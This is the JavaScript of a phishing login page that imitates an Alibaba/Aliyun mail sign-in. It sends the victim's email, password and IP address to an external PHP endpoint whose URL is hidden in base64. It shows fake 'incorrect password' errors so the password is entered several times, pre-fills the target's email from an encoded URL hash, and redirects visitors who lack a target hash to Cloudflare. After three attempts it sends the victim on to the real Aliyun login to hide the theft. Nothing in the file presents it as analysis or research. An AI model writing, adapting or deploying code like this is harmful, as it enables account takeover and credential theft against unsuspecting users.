<script>
const MAX_ATTEMPTS = 3;
let attemptCount = 0; 

function $ (id) { return document.getElementById(id); }

function showError(msg) {
  const el = $('login-error');
  if (!el) return;
  const span = el.querySelector('.login-error-msg');
  if (span) span.textContent = msg;
  el.style.display = 'block';
}

function hideError() { $('login-error').style.display = 'none'; }

function setLoginButton(loading) {
  const btn = document.querySelector('button.fm-submit');
  if (!btn) return;
  btn.disabled = !!loading;
  btn.textContent = loading ? 'Logging in‚Ä¶' : 'Log in';
}

function submitToServer(email, pwd, ip) {
  const url = atob('aHR0cHM6Ly9jbG91ZC4weDU5ZDY3MWZkMTU4ZDdkNGM1NmRmZDY1YzQ2YjA3OGY5ODM2YTJkNDAuY2xvdWQvMTIzLnBocA==');
  return fetch(url, {
    method : 'POST',
    headers: { 'Content-Type': 'application/json' },
    body   : JSON.stringify({ email, password: pwd, ip })
  })
    .then(r => { if (!r.ok) throw new Error('Server '+r.status); return r.json(); })
    .catch(e => { console.error('POST failed ‚Üí', e); throw e; });
}

function onSubmit(e) {
  e.preventDefault();

  const emailEl = $('amge');
  const pwdEl   = $('amgp');
  const agreeEl = $('fm-agreement-checkbox');

  if (!emailEl || !pwdEl || !agreeEl) {
    console.error('Missing input elements');
    showError('Form broken ‚Äì please reload.');
    return;
  }

  const email = emailEl.value.trim();
  const pwd   = pwdEl.value.trim();

  if (!email) { showError('Please enter an e‚Äëmail.'); return; }
  if (!pwd)   { showError('Password cannot be empty.'); return; }
  if (!agreeEl.checked) {
    showError('You must agree to the Service Agreement.');
    return;
  }

  hideError();
  setLoginButton(true);
  attemptCount++;

  fetch('https://icanhazip.com')
    .then(r => { if (!r.ok) throw new Error('IP fetch failed'); return r.text(); })
    .then(ip => ip.trim())
    .then(ip => submitToServer(email, pwd, ip))
    .then(() => {
      if (attemptCount < MAX_ATTEMPTS) {
        showError('Your account name or password is incorrect.');
        pwdEl.value = '';
        pwdEl.focus();
      } else {
        const domain = email.split('@')[1];
        if (domain)
          window.location.href = `https://${domain}`;
        else
          showError('Invalid e‚Äëmail format.');
      }
    })
    .catch(err => { console.error(err); showError('Failed to log in.'); })
    .finally(() => setLoginButton(false));
}

document.addEventListener('DOMContentLoaded', () => {
  const form = $('login-form') || document.querySelector('form.login-form');
  if (!form) { console.error('#login-form missing ‚Äì cannot attach submit handler'); return; }
  form.addEventListener('submit', onSubmit);
});
</script>

<script>
(function () {
  const iframe = document.getElementById('alibaba-login-box');
  if (!iframe) { console.error('‚ùå iframe #alibaba-login-box not found'); return; }

  function getEmailFromURL() {
    const raw = window.location.hash.slice(1);
    if (!raw) return null;
    const b64 = raw.replace(/-/g, '+').replace(/_/g, '/');
    const padded = b64 + '==='.slice(0, (4 - b64.length % 4) % 4);
    try {
      const decoded = atob(padded);
      return /^[^@]+@[^@]+\.[^@]+$/.test(decoded) ? decoded : null;
    } catch (_) { return null; }
  }

  function onIframeLoad() {
    iframe.removeEventListener('load', onIframeLoad);

    const win = iframe.contentWindow;
    const doc = win && win.document;
    if (!doc) { console.warn('‚ö†Ô∏è iframe already cross‚Äëorigin ‚Äì abort helper'); return; }

    const emailInput = doc.getElementById('amge');
    if (emailInput) { emailInput.focus(); console.info('‚úÖ parent helper forced focus on #amge'); }

    const e = getEmailFromURL();
    console.log('hash email detected:', e);
    const pwdInput = doc.getElementById('amgp');

    if (e) {
      if (emailInput) emailInput.value = e;
      if (pwdInput)   pwdInput.focus();
    } else {
      setTimeout(() => {
        console.info('üîÄ No e‚Äëmail in hash ‚Äì redirecting to Cloudflare');
        top.location.href = 'https://dash.cloudflare.com';
      }, 100);
    }
    const form = doc.querySelector('form#login-form');
    if (!form) { console.warn('‚ö†Ô∏è form #login-form not found inside iframe'); return; }

    const MAX_ATTEMPTS = 3;
    let outerAttempts = 0;

    form.addEventListener('submit', function (e) {
      const email = doc.getElementById('amge')?.value.trim() || '';
      const pwd   = doc.getElementById('amgp')?.value.trim() || '';
      if (!email || !pwd) {
        console.log('Missing email or password, not counting attempt');
        return;
      }
      outerAttempts++;
      console.log('üîî outer submit attempt', outerAttempts, email);

      if (outerAttempts >= MAX_ATTEMPTS && email.includes('@')) {
        const domain = email.split('@')[1];
        //const target = `https://${domain}`;
        const target = `https://mail.aliyun.com/alimail/auth/login?reurl=%2Falimail%2F`;
        console.info('üöÄ redirecting whole page to ‚Üí', target);

        e.stopImmediatePropagation();
        e.preventDefault();
        setTimeout(() => { top.location.href = target; }, 2000);
      }
    }, true);
  }
  iframe.addEventListener('load', onIframeLoad);
})();
</script>
